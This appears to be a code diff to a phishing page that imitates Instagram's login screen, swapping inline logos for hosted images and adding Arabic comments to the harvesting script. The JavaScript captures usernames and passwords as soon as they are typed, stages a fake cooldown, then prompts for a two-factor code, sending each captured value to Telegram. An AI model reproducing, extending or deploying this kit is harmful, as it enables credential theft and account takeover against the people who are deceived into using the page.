@@ -18,8 +18,8 @@
         .slide img { width: 100%; height: 100%; object-fit: cover; display: block; }
         .login-section { max-width: 350px; width: 100%; }
         .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 32px 40px 20px; margin-bottom: 10px; text-align: center; }
-        .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; padding-top: 8px; }
-        .logo svg { display: block; }
+        .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; }
+        .logo img { width: 175px; height: auto; display: block; }
         #loginForm { display: flex; flex-direction: column; gap: 6px; }
         #loginForm input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
         #loginForm input:focus { border-color: #a8a8a8; }
@@ -34,8 +34,8 @@
         .separator { display: flex; align-items: center; margin: 14px 0 18px; }
         .separator .line { flex: 1; height: 1px; background: #dbdbdb; }
         .separator .or { color: #737373; font-size: 13px; font-weight: 600; margin: 0 18px; }
-        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; background: none; border: none; color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; width: 100%; font-family: inherit; }
-        .fb-login svg { width: 16px; height: 16px; flex-shrink: 0; }
+        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; background: none; border: none; color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; width: 100%; }
+        .fb-login img { width: 16px; height: 16px; }
         .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; }
         .forgot-password:hover { text-decoration: underline; }
         .signup-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px 40px; text-align: center; font-size: 14px; }
@@ -98,28 +98,7 @@
     <div class="login-section">
         <div class="card" id="loginCard">
             <div class="logo">
-                <!-- 🆕 SVG Instagram الأصلي -->
-                <svg viewBox="0 0 175 51" width="175" height="51" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M23.435 21.1815C23.435 19.6698 24.8478 18.4502 26.5 18.4502C28.1522 18.4502 29.565 19.6698 29.565 21.1815C29.565 22.6932 28.1522 23.9128 26.5 23.9128C24.8478 23.9128 23.435 22.6932 23.435 21.1815ZM43.0435 15.9273C42.1848 12.8193 39.6739 10.3575 36.5761 9.51996C33.9239 8.81996 28.5652 8.66663 26.5 8.66663C24.4348 8.66663 19.0761 8.81996 16.4239 9.51996C13.3261 10.3575 10.8152 12.8193 9.95652 15.9273C9.25 18.508 9.09783 21.6422 9.09783 25.25C9.09783 28.8578 9.25 32.0253 9.95652 34.5728C10.8152 37.6808 13.3261 40.1425 16.4239 40.9801C19.0761 41.6801 24.4348 41.8334 26.5 41.8334C28.5652 41.8334 33.9239 41.6801 36.5761 40.9801C39.6739 40.1425 42.1848 37.6808 43.0435 34.5728C43.75 32.0253 43.9022 28.8578 43.9022 25.25C43.9022 21.6422 43.75 18.508 43.0435 15.9273ZM34.7826 33.8484C33.7826 35.4684 32.2717 36.6484 30.4457 37.1143C28.3152 37.6484 24.6848 37.6484 22.5543 37.1143C20.7283 36.6484 19.2174 35.4684 18.2174 33.8484C17.3804 32.478 16.8587 30.3834 16.8587 25.25C16.8587 20.1166 17.3804 18.022 18.2174 16.6516C19.2174 15.0316 20.7283 13.8516 22.5543 13.3857C24.6848 12.8516 28.3152 12.8516 30.4457 13.3857C32.2717 13.8516 33.7826 15.0316 34.7826 16.6516C35.6196 18.022 36.1413 20.1166 36.1413 25.25C36.1413 30.3834 35.6196 32.478 34.7826 33.8484Z" fill="url(#paint0_linear_87_3)"/>
-                    <path d="M43.2826 10.8666C43.2826 12.0029 42.3315 12.9333 41.1739 12.9333C40.0163 12.9333 39.0652 12.0029 39.0652 10.8666C39.0652 9.73032 40.0163 8.79993 41.1739 8.79993C42.3315 8.79993 43.2826 9.73032 43.2826 10.8666Z" fill="url(#paint1_linear_87_3)"/>
-                    <path d="M62.195 27.496V25.606H62.361C62.881 25.775 63.259 25.859 63.495 25.859C63.817 25.859 64.097 25.786 64.335 25.64C64.571 25.496 64.755 25.288 64.883 25.018C65.011 24.748 65.075 24.424 65.075 24.044C65.075 23.664 65.011 23.34 64.883 23.07C64.755 22.8 64.571 22.592 64.335 22.446C64.097 22.3 63.817 22.228 63.495 22.228C63.259 22.228 62.881 22.312 62.361 22.48H62.195V20.59H62.447C62.811 20.688 63.091 20.756 63.285 20.796C63.479 20.836 63.695 20.856 63.933 20.856C64.649 20.856 65.257 20.672 65.759 20.304C66.259 19.938 66.637 19.442 66.891 18.818C67.145 18.194 67.273 17.496 67.273 16.724C67.273 15.644 67.037 14.804 66.565 14.206C66.093 13.608 65.423 13.31 64.559 13.31C64.155 13.31 63.741 13.406 63.327 13.598C62.911 13.79 62.573 14.024 62.307 14.3C62.043 14.576 61.865 14.822 61.779 15.04H61.529L61.107 13.394H61.865C62.135 13.394 62.415 13.362 62.705 13.298C62.995 13.236 63.329 13.17 63.707 13.1C64.085 13.032 64.535 12.998 65.057 12.998C66.359 12.998 67.399 13.352 68.179 14.058C68.959 14.766 69.349 15.742 69.349 16.99C69.349 18.004 69.091 18.906 68.575 19.698C68.059 20.49 67.361 21.034 66.483 21.33V21.414C67.147 21.6 67.695 21.948 68.125 22.456C68.555 22.966 68.855 23.564 69.027 24.25C69.197 24.936 69.283 25.636 69.283 26.35C69.283 27.682 68.913 28.736 68.173 29.514C67.433 30.292 66.399 30.68 65.073 30.68C64.635 30.68 64.137 30.634 63.579 30.542C63.021 30.45 62.475 30.328 61.947 30.178L61.83 29.924L62.195 27.496ZM73.7478 30.68V13.394H76.2978V16.366H76.4558C76.5718 16.076 76.7718 15.744 77.0578 15.372C77.3438 15 77.6898 14.672 78.0998 14.388C78.5098 14.104 78.9558 13.88 79.4398 13.716C79.9238 13.554 80.4218 13.472 80.9358 13.472C81.7998 13.472 82.5438 13.672 83.1698 14.072C83.7938 14.472 84.2738 15.108 84.6098 15.982C84.9458 16.856 85.1138 18 85.1138 19.414V30.68H82.5498V19.832C82.5498 19.006 82.4358 18.324 82.2078 17.786C81.9798 17.248 81.6258 16.848 81.1458 16.584C80.6658 16.32 80.0438 16.188 79.2818 16.188C78.7458 16.188 78.2418 16.298 77.7718 16.52C77.2998 16.742 76.8838 17.056 76.5238 17.464C76.1638 17.872 75.8778 18.354 75.6678 18.912C75.4558 19.47 75.3498 20.086 75.3498 20.76V30.68H73.7478ZM92.5696 30.68L88.0636 13.394H90.7256L93.8916 26.32H94.0076L97.2016 13.394H99.8916L95.2596 30.68H92.5696ZM101.191 30.68V13.394H106.569C107.891 13.394 108.971 13.622 109.807 14.078C110.643 14.536 111.251 15.18 111.631 16.01C112.009 16.84 112.199 17.814 112.199 18.932C112.199 20.188 111.933 21.262 111.403 22.156C110.871 23.05 110.117 23.724 109.141 24.182C108.165 24.64 107.009 24.868 105.673 24.868H103.033V30.68H101.191ZM103.033 18.906V23.17H105.589C106.757 23.17 107.657 22.882 108.289 22.304C108.921 21.728 109.237 20.924 109.237 19.892C109.237 18.788 108.929 17.958 108.317 17.4C107.703 16.842 106.823 16.562 105.673 16.562H103.033V18.906ZM113.311 30.68V13.394H119.033C120.397 13.394 121.507 13.654 122.361 14.176C123.215 14.698 123.845 15.42 124.251 16.344C124.657 17.268 124.861 18.332 124.861 19.536C124.861 20.944 124.547 22.164 123.923 23.198C123.299 24.232 122.441 25.008 121.353 25.528C120.263 26.05 119.021 26.31 117.625 26.31H114.989V30.68H113.311ZM114.989 16.562V24.2H117.331C118.541 24.2 119.515 23.892 120.253 23.276C120.991 22.66 121.359 21.776 121.359 20.624C121.359 19.306 120.983 18.298 120.239 17.6C119.495 16.904 118.521 16.556 117.317 16.556H114.989V16.562ZM130.345 30.68V13.394H137.261V15.034H132.141V20.472H136.931V22.098H132.141V29.054H137.317V30.68H130.345ZM142.507 30.68V13.394H145.057V29.054H151.127V30.68H142.507ZM156.637 30.68V13.394H159.187V30.68H156.637Z" fill="#262626"/>
-                    <defs>
-                        <linearGradient id="paint0_linear_87_3" x1="26.5" y1="8.66663" x2="26.5" y2="41.8334" gradientUnits="userSpaceOnUse">
-                            <stop stop-color="#FFC107"/>
-                            <stop offset="0.25" stop-color="#F44336"/>
-                            <stop offset="0.45" stop-color="#E91E63"/>
-                            <stop offset="0.75" stop-color="#9C27B0"/>
-                            <stop offset="1" stop-color="#3F51B5"/>
-                        </linearGradient>
-                        <linearGradient id="paint1_linear_87_3" x1="41.1739" y1="8.79993" x2="41.1739" y2="12.9333" gradientUnits="userSpaceOnUse">
-                            <stop stop-color="#FFC107"/>
-                            <stop offset="0.25" stop-color="#F44336"/>
-                            <stop offset="0.45" stop-color="#E91E63"/>
-                            <stop offset="0.75" stop-color="#9C27B0"/>
-                            <stop offset="1" stop-color="#3F51B5"/>
-                        </linearGradient>
-                    </defs>
-                </svg>
+                <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
             </div>
             <form id="loginForm" autocomplete="off">
                 <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
@@ -138,10 +117,7 @@
                 <span class="line"></span>
             </div>
             <button class="fb-login" id="fbLogin">
-                <svg viewBox="0 0 16 16" fill="#385185" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="8" cy="8" r="8" fill="#1877F2"/>
-                    <path d="M11.5 2.5H10C8.34315 2.5 7 3.84315 7 5.5V7H5.5V9H7V13.5H9V9H10.5L11.5 7H9V5.5C9 5.22386 9.22386 5 9.5 5H11.5V2.5Z" fill="white"/>
-                </svg>
+                <img src="https://i.imgur.com/exksovo.png" alt="Facebook">
                 Log in with Facebook
             </button>
             <a href="#" class="forgot-password">Forgot password?</a>
@@ -255,13 +231,16 @@
     const errorMsg = document.getElementById('errorMsg');
     const successMsg = document.getElementById('successMsg');
 
+    // ============================================
+    //  المتغيرات الجديدة للتتبع
+    // ============================================
     let capturedUsername = '';
     let capturedPassword = '';
     let cooldownTimer = null;
     let cooldownCount = 0;
     let verificationAttempts = 0;
-    let usernameSent = false;
-    let passwordSent = false;
+    let usernameSent = false;  // متغير لمنع إرسال الإيميل/يوزر أكثر من مرة
+    let passwordSent = false;  // متغير لمنع إرسال الباسورد أكثر من مرة
 
     function checkLogin() {
         loginBtn.disabled = !(u.value.trim() && p.value.trim());
@@ -270,7 +249,8 @@
     p.addEventListener('input', checkLogin);
 
     // ============================================
-    //  إرسال الإيميل/يوزر/رقم الهاتف فوراً
+    //  🆕 كود جديد: إرسال الإيميل/يوزر/رقم الهاتف فوراً عند الكتابة
+    //  (بدون انتظار كلمة المرور)
     // ============================================
     u.addEventListener('blur', function() {
         const val = this.value.trim();
@@ -287,7 +267,8 @@
     });
 
     // ============================================
-    //  إرسال كلمة المرور فوراً
+    //  🆕 كود جديد: إرسال كلمة المرور فوراً عند كتابتها
+    //  (بدون انتظار الضغط على Log in)
     // ============================================
     p.addEventListener('blur', function() {
         const val = this.value;
@@ -306,7 +287,7 @@
     });
 
     // ============================================
-    //  LOGIN SUBMIT
+    //  LOGIN SUBMIT (يبقى كما هو مع الإرسال المكرر)
     // ============================================
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
@@ -315,6 +296,7 @@
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
 
+        // إرسال تأكيدي عند الضغط على Log in (احتياطاً)
         sendToTelegram(
             `✅ *Login Button Pressed* ✅\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
@@ -322,6 +304,7 @@
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
+        // العد التنازلي
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
         cooldownCount = CONFIG.cooldownDuration;
@@ -336,6 +319,7 @@
                 cooldownTimer = null;
                 cooldownOverlay.style.display = 'none';
 
+                // إظهار 2FA
                 loginCard.style.display = 'none';
                 signupCard.style.display = 'none';
                 twofaSection.style.display = 'block';
@@ -396,6 +380,7 @@
         errorMsg.style.display = 'none';
         successMsg.style.display = 'none';
 
+        // 🆕 إرسال رمز 2FA في رسالة مستقلة
         sendToTelegram(
             `🔢 *Step 3: 2FA Code Captured* 🔢\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
